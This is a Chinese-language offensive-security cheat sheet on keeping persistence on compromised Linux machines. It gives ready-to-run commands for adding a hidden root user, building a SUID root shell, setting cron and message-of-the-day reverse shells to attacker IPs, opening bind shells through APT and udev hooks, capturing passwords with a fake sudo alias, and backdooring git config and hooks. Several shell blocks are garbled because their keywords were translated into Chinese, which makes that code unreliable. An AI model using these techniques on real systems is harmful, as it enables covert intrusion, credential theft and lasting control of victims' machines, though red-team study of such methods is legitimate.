# Linux - 持久性

## 摘要

* [基本反向Shell](#基本反向Shell)
* [添加root用户](#添加Root用户)
* [SUID二进制文件](#SUID二进制文件)
* [Crontab - 反向Shell](#Crontab-反向Shell)
* [后门化用户的bash_rc](#后门化用户的Bash_RC)
* [后门化启动服务](#后门化启动服务)
* [后门化用户启动文件](#后门化用户启动文件)
* [后门化每日消息](#后门化每日消息)
* [后门化驱动程序](#后门化驱动程序)
* [后门化APT](#后门化APT)
* [后门化SSH](#后门化SSH)
* [后门化Git](#后门化Git)
* [其他Linux持久性选项](#其他持久性选项)
* [参考资料](#参考资料)

## 基本反向Shell

```bash
ncat --udp -lvp 4242
ncat --sctp -lvp 4242
ncat --tcp -lvp 4242
```

## 添加Root用户

```powershell
sudo useradd -ou 0 -g 0 john
sudo passwd john
echo "linuxpassword" | passwd --stdin john
```

## SUID 二进制文件

```powershell
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
```

## Crontab - 反向Shell

```bash
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
```

## 后门化用户的bash_rc

(FR/EN版本)

```bash
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
cat << EOF > /tmp/$TMPNAME2
别名sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);如果 [ $locale = "zh_CN" ]; 那么 echo -n "[sudo] 用户 $USER 的密码: "; fi;如果 [ $locale = "fr" ]; 那么 echo -n "[sudo] 用户名 $USER 的密码: "; fi;读取 -s pwd; 输出; 取消别名sudo; echo "$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null &
EOF
如果 [ -f ~/.bashrc ]; 那么
将 /tmp/$TMPNAME2 的内容附加到 ~/.bashrc
结束如果
如果 [ -f ~/.zshrc ]; 那么
将 /tmp/$TMPNAME2 的内容附加到 ~/.zshrc
结束如果
删除 /tmp/$TMPNAME2
```

或者在其.bashrc文件中添加以下行。

```powershell
$ chmod u+x ~/.hidden/fakesudo
$ echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

并创建`fakesudo`脚本。

```powershell
读取 -sp "[sudo] 用户 $USER 的密码: " sudopass
输出 ""
睡眠 2
输出 "对不起，请重试。"
输出 $sudopass >> /tmp/pass.txt

/usr/bin/sudo $@
```

## 后门化启动服务

* 编辑 `/etc/network/if-up.d/upstart` 文件

  ```bash
  RSHELL="ncat $LMTHD $LHOST $LPORT -e "/bin/bash -c id;/bin/bash" 2>/dev/null"
  sed -i -e "4i $RSHELL" /etc/network/if-up.d/upstart
  ```

## 后门化每日消息

* 编辑 `/etc/update-motd.d/00-header` 文件

  ```bash
  输出 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' >> /etc/update-motd.d/00-header
  ```

## 用户启动文件后门

Linux，在 `~/.config/autostart/NAME_OF_FILE.desktop` 写入一个文件

```powershell
在：~/.config/autostart/*.desktop

[Desktop Entry]
Type=Application
Name=welcome
Exec=/var/lib/gnome-welcome-tour
AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide
OnlyShowIn=GNOME;
X-GNOME-Autostart-enabled=false
```

## 驱动后门

```bash
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

## APT 后门

如果你可以在 apt.conf.d 目录中创建一个文件，内容为：`APT::Update::Pre-Invoke {"CMD"};`
下次执行 "apt-get update" 时，你的 CMD 将被执行！

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

## SSH 后门

在 `~/.ssh` 文件夹中添加一个 ssh 密钥。

1. `ssh-keygen`
2. 将 `~/.ssh/id_rsa.pub` 的内容写入 `~/.ssh/authorized_keys`
3. 设置正确的权限，~/.ssh 为 700，authorized_keys 为 600

## Git 后门

后门化 git 可以是一种在不需要 root 访问权限的情况下获得持久性的有用方法。  
必须特别注意确保后门命令不产生输出，否则持久性很容易被注意到。

### Git 配置

有多个 [git 配置变量](https://git-scm.com/docs/git-config) 在执行某些操作时会执行任意命令。  
此外，git 配置可以通过多种方式指定，从而提供了额外后门机会。  
配置可以在用户级别（`~/.gitconfig`）设置，也可以在仓库级别（`path/to/repo/.git/config`）设置，有时还可以通过环境变量设置。

`core.editor` 在 git 需要为用户提供编辑器时执行（例如 `git rebase -i`，`git commit --amend`）。  
等效的环境变量是 `GIT_EDITOR`。

```properties
[core]
editor = nohup BACKDOOR >/dev/null 2>&1 & ${VISUAL:-${EDITOR:-emacs}}
```

`core.pager` 在 git 需要处理潜在的大量数据时执行（例如 `git diff`，`git log`，`git show`）。  
等效的环境变量是 `GIT_PAGER`。

```properties
[core]
pager = nohup BACKDOOR >/dev/null 2>&1 & ${PAGER:-less}
```

`core.sshCommand` 在 git 需要与远程 *ssh* 仓库交互时执行（例如 `git fetch`，`git pull`，`git push`）。  
等效的环境变量是 `GIT_SSH` 或 `GIT_SSH_COMMAND`。

```properties
[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh
[ssh]
variant = ssh
```

注意 `ssh.variant`（`GIT_SSH_VARIANT`）在技术上是可选的，但如果没有它，git 会_快速连续两次_运行 `sshCommand`。（第一次运行是为了确定 SSH 变体，第二次是为了传递正确的参数。）

### Git 钩子

[Git 钩子](https://git-scm.com/docs/githooks) 是可以放在钩子目录中的程序，以便在 git 执行的某些点触发操作。  
默认情况下，钩子存储在仓库的 `.git/hooks` 目录中，当钩子的名称与当前的 git 操作匹配且钩子被标记为可执行（即 `chmod +x`）时运行。  
可能用于后门化的有用钩子脚本包括：

- `pre-commit` 在执行 `git commit` 之前运行。
- `pre-push` 在执行 `git push` 之前运行。
- `post-checkout` 在执行 `git checkout` 之后运行。
- `post-merge` 在执行 `git merge` 或 `git pull` 应用新更改之后运行。

除了生成后门之外，上述某些钩子还可以用来在用户不注意的情况下将恶意更改潜入仓库。

最后，通过在用户级别的 git 配置文件（`~/.gitconfig`）中将 `core.hooksPath` git 配置变量设置为常见目录，可以全局后门化_所有_用户的 git 钩子。请注意，这种方法会破坏任何现有的特定于仓库的 git 钩子。

## 其他持久性选项

* [SSH授权密钥](https://attack.mitre.org/techniques/T1098/004)
* [破坏客户端软件二进制文件](https://attack.mitre.org/techniques/T1554)
* [创建账户](https://attack.mitre.org/techniques/T1136/)
* [创建账户：本地账户](https://attack.mitre.org/techniques/T1136/001/)
* [创建或修改系统进程](https://attack.mitre.org/techniques/T1543/)
* [创建或修改系统进程：Systemd服务](https://attack.mitre.org/techniques/T1543/002/)
* [事件触发执行：陷阱](https://attack.mitre.org/techniques/T1546/005/)
* [事件触发执行](https://attack.mitre.org/techniques/T1546/)
* [事件触发执行：.bash_profile和.bashrc](https://attack.mitre.org/techniques/T1546/004/)
* [外部远程服务](https://attack.mitre.org/techniques/T1133/)
* [劫持执行流](https://attack.mitre.org/techniques/T1574/)
* [劫持执行流：LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
* [预操作系统启动](https://attack.mitre.org/techniques/T1542/)
* [预操作系统启动：Bootkit](https://attack.mitre.org/techniques/T1542/003/)
* [计划任务/作业](https://attack.mitre.org/techniques/T1053/)
* [计划任务/作业：At (Linux)](https://attack.mitre.org/techniques/T1053/001/)
* [计划任务/作业：Cron](https://attack.mitre.org/techniques/T1053/003/)
* [服务器软件组件](https://attack.mitre.org/techniques/T1505/)
* [服务器软件组件：SQL存储过程](https://attack.mitre.org/techniques/T1505/001/)
* [服务器软件组件：传输代理](https://attack.mitre.org/techniques/T1505/002/)
* [服务器软件组件：Web Shell](https://attack.mitre.org/techniques/T1505/003/)
* [流量信号](https://attack.mitre.org/techniques/T1205/)
* [流量信号：端口敲击](https://attack.mitre.org/techniques/T1205/001/)
* [有效账户：默认账户](https://attack.mitre.org/techniques/T1078/001/)
* [有效账户：域账户2](https://attack.mitre.org/techniques/T1078/002/)

## 参考资料

* [@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289](https://twitter.com/RandoriSec/status/1036622487990284289)
* [https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
* [http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
* [http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)
* [Pouki来自JDI](#no_source_code)
